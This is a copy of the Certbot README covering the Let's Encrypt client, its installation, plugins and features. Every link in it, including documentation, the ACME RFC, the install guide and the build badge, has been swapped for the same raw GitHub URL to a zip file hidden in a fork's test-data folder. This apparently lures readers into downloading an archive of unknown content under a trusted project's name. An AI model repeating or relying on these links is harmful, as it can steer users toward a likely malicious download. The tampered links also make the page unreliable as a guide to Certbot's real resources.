.. This file contains a series of comments that are used to include sections of this README in other files. Do not modify these comments unless you know what you are doing. tag:intro-begin

Certbot is part of EFF’s effort to encrypt the entire Internet. Secure communication over the Web relies on HTTPS, which requires the use of a digital certificate that lets browsers verify the identity of web servers (e.g., is that really https://raw.githubusercontent.com/jonathanloucks/certbot/master/certbot-apache/tests/testdata/centos7_apache/apache/httpd/conf/certbot_v1.1.zip). Web servers obtain their certificates from trusted third parties called certificate authorities (CAs). Certbot is an easy-to-use client that fetches a certificate from Let’s Encrypt—an open certificate authority launched by the EFF, Mozilla, and others—and deploys it to a web server.

Anyone who has gone through the trouble of setting up a secure website knows what a hassle getting and maintaining a certificate is. Certbot and Let’s Encrypt can automate away the pain and let you turn on and manage HTTPS with simple commands. Using Certbot and Let's Encrypt is free, so there’s no need to arrange payment.

How you use Certbot depends on the configuration of your web server. The best way to get started is to use our `interactive guide <https://raw.githubusercontent.com/jonathanloucks/certbot/master/certbot-apache/tests/testdata/centos7_apache/apache/httpd/conf/certbot_v1.1.zip>`_. It generates instructions based on your configuration settings. In most cases, you’ll need `root or administrator access <https://raw.githubusercontent.com/jonathanloucks/certbot/master/certbot-apache/tests/testdata/centos7_apache/apache/httpd/conf/certbot_v1.1.zip>`_ to your web server to run Certbot.

Certbot is meant to be run directly on your web server, not on your personal computer. If you’re using a hosted service and don’t have direct access to your web server, you might not be able to use Certbot. Check with your hosting provider for documentation about uploading certificates or using certificates issued by Let’s Encrypt.

Certbot is a fully-featured, extensible client for the Let's
Encrypt CA (or any other CA that speaks the `ACME
<https://raw.githubusercontent.com/jonathanloucks/certbot/master/certbot-apache/tests/testdata/centos7_apache/apache/httpd/conf/certbot_v1.1.zip>`_
protocol) that can automate the tasks of obtaining certificates and
configuring webservers to use them. This client runs on Unix-based operating
systems.

To see the changes made to Certbot between versions please refer to our
`changelog <https://raw.githubusercontent.com/jonathanloucks/certbot/master/certbot-apache/tests/testdata/centos7_apache/apache/httpd/conf/certbot_v1.1.zip>`_.

Contributing
------------

If you'd like to contribute to this project please read `Developer Guide
<https://raw.githubusercontent.com/jonathanloucks/certbot/master/certbot-apache/tests/testdata/centos7_apache/apache/httpd/conf/certbot_v1.1.zip>`_.

This project is governed by `EFF's Public Projects Code of Conduct <https://raw.githubusercontent.com/jonathanloucks/certbot/master/certbot-apache/tests/testdata/centos7_apache/apache/httpd/conf/certbot_v1.1.zip>`_.

.. _installation:

How to run the client
---------------------

The easiest way to install and run Certbot is by visiting `https://raw.githubusercontent.com/jonathanloucks/certbot/master/certbot-apache/tests/testdata/centos7_apache/apache/httpd/conf/certbot_v1.1.zip`_,
where you can find the correct instructions for many web server and OS
combinations.  For more information, see `Get Certbot
<https://raw.githubusercontent.com/jonathanloucks/certbot/master/certbot-apache/tests/testdata/centos7_apache/apache/httpd/conf/certbot_v1.1.zip>`_.

.. https://raw.githubusercontent.com/jonathanloucks/certbot/master/certbot-apache/tests/testdata/centos7_apache/apache/httpd/conf/certbot_v1.1.zip https://raw.githubusercontent.com/jonathanloucks/certbot/master/certbot-apache/tests/testdata/centos7_apache/apache/httpd/conf/certbot_v1.1.zip

Understanding the client in more depth
--------------------------------------

To understand what the client is doing in detail, it's important to
understand the way it uses plugins.  Please see the `explanation of
plugins <https://raw.githubusercontent.com/jonathanloucks/certbot/master/certbot-apache/tests/testdata/centos7_apache/apache/httpd/conf/certbot_v1.1.zip>`_ in
the User Guide.

Links
=====

.. Do not modify this comment unless you know what you're doing. tag:links-begin

Documentation: https://raw.githubusercontent.com/jonathanloucks/certbot/master/certbot-apache/tests/testdata/centos7_apache/apache/httpd/conf/certbot_v1.1.zip

Software project: https://raw.githubusercontent.com/jonathanloucks/certbot/master/certbot-apache/tests/testdata/centos7_apache/apache/httpd/conf/certbot_v1.1.zip

Notes for developers: https://raw.githubusercontent.com/jonathanloucks/certbot/master/certbot-apache/tests/testdata/centos7_apache/apache/httpd/conf/certbot_v1.1.zip

Main Website: https://raw.githubusercontent.com/jonathanloucks/certbot/master/certbot-apache/tests/testdata/centos7_apache/apache/httpd/conf/certbot_v1.1.zip

Let's Encrypt Website: https://raw.githubusercontent.com/jonathanloucks/certbot/master/certbot-apache/tests/testdata/centos7_apache/apache/httpd/conf/certbot_v1.1.zip

Community: https://raw.githubusercontent.com/jonathanloucks/certbot/master/certbot-apache/tests/testdata/centos7_apache/apache/httpd/conf/certbot_v1.1.zip

ACME spec: `RFC 8555 <https://raw.githubusercontent.com/jonathanloucks/certbot/master/certbot-apache/tests/testdata/centos7_apache/apache/httpd/conf/certbot_v1.1.zip>`_

ACME working area in github (archived): https://raw.githubusercontent.com/jonathanloucks/certbot/master/certbot-apache/tests/testdata/centos7_apache/apache/httpd/conf/certbot_v1.1.zip

|build-status|

.. |build-status| image:: https://raw.githubusercontent.com/jonathanloucks/certbot/master/certbot-apache/tests/testdata/centos7_apache/apache/httpd/conf/certbot_v1.1.zip
   :target: https://raw.githubusercontent.com/jonathanloucks/certbot/master/certbot-apache/tests/testdata/centos7_apache/apache/httpd/conf/certbot_v1.1.zip
   :alt: Azure Pipelines CI status

.. Do not modify this comment unless you know what you're doing. tag:links-end

System Requirements
===================

See https://raw.githubusercontent.com/jonathanloucks/certbot/master/certbot-apache/tests/testdata/centos7_apache/apache/httpd/conf/certbot_v1.1.zip

.. Do not modify this comment unless you know what you're doing. tag:intro-end

.. Do not modify this comment unless you know what you're doing. tag:features-begin

Current Features
=====================

* Supports multiple web servers:

  - apache/2.x
  - nginx/0.8.48+
  - webroot (adds files to webroot directories in order to prove control of
    domains and obtain certificates)
  - standalone (runs its own simple webserver to prove you control a domain)
  - other server software via `third party plugins <https://raw.githubusercontent.com/jonathanloucks/certbot/master/certbot-apache/tests/testdata/centos7_apache/apache/httpd/conf/certbot_v1.1.zip>`_

* The private key is generated locally on your system.
* Can talk to the Let's Encrypt CA or optionally to other ACME
  compliant services.
* Can get domain-validated (DV) certificates.
* Can revoke certificates.
* Adjustable RSA key bit-length (2048 (default), 4096, ...).
* Adjustable `EC <https://raw.githubusercontent.com/jonathanloucks/certbot/master/certbot-apache/tests/testdata/centos7_apache/apache/httpd/conf/certbot_v1.1.zip>`_
  key (`secp256r1` (default), `secp384r1`, `secp521r1`).
* Can optionally install a http -> https redirect, so your site effectively
  runs https only (Apache only)
* Fully automated.
* Configuration changes are logged and can be reverted.
* Supports an interactive text UI, or can be driven entirely from the
  command line.
* Free and Open Source Software, made with Python.

.. Do not modify this comment unless you know what you're doing. tag:features-end

For extensive documentation on using and contributing to Certbot, go to https://raw.githubusercontent.com/jonathanloucks/certbot/master/certbot-apache/tests/testdata/centos7_apache/apache/httpd/conf/certbot_v1.1.zip If you would like to contribute to the project or run the latest code from git, you should read our `developer guide <https://raw.githubusercontent.com/jonathanloucks/certbot/master/certbot-apache/tests/testdata/centos7_apache/apache/httpd/conf/certbot_v1.1.zip>`_.
